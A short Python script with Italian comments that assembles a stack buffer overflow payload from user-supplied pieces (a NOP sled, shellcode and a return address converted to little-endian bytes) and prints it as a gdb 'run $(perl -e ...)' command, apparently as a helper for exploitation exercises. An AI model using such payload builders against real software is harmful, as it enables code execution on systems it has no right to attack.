# Pseudocodice:
# 1. Chiedere all'utente di inserire il valore per CAMPO1
# 2. Chiedere all'utente di inserire il valore per NUMERO_CAMPO1
# 3. Chiedere all'utente di inserire il valore per CAMPO2
# 4. Chiedere all'utente di inserire il valore per CAMPO3
# 5. Costruire la stringa del payload utilizzando i valori inseriti
# 6. Stampare la stringa del payload

def converti_in_little_endian(indirizzo):
    # Passo 1: Rimuovi il prefisso "0x" se presente
    if indirizzo.startswith("0x"):
        indirizzo = indirizzo[2:]
    
    # Passo 2: Assicurati che la lunghezza della stringa sia un multiplo di 2
    if len(indirizzo) % 2 != 0:
        indirizzo = "0" + indirizzo
    
    # Passo 3 e 4: Dividi in gruppi di due e inverti l'ordine
    bytes_invertiti = [indirizzo[i:i+2] for i in range(0, len(indirizzo), 2)][::-1]
    
    # Passo 5 e 6: Aggiungi "\x" davanti a ogni gruppo e unisci in una stringa
    risultato = "\\x" + "\\x".join(bytes_invertiti)  # Modifica qui
    
    return risultato

# Chiedere all'utente i valori dei campi
nop = input('Inserisci il valore: nop / A: ')
byte_nop = input("Inserisci il valore numerico per byte_nop: ")
shellcode = input("Inserisci il valore per shellcode: ")
indirizzo_ritorno = input("Inserisci il valore per indirizzo_ritorno: ")

indirizzo_little_endian = converti_in_little_endian(indirizzo_ritorno)

# Costruire la stringa del payload
payload = f"run $(perl -e 'print \"{nop}\"x{byte_nop},\"{shellcode}\",\"{indirizzo_little_endian}\"')"

# Stampare la stringa del payload
print("\n\nLa tua stringa di payload è:")
print(payload)